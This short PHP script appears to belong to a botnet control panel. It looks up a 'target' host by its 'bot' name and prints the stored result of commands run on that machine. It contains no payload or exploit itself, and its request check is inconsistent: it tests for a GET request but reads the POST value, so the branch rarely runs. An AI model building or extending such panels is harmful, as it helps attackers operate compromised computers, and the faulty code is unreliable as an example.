<?php 
include 'session.php';
include 'conn.php';

if($_SERVER["REQUEST_METHOD"] == "GET" && isset($_POST["bot"]))
{
    $retrieveResult = $mysql->prepare("select commandresult from targets where hostname=?");
    $retrieveResult->bind_param("s", $_GET["bot"]);
    $retrieveResult->execute();
    $retrieveResult->bind_result($commandresult);
    $retrieveResult->fetch();
    echo $commandresult;
}

?>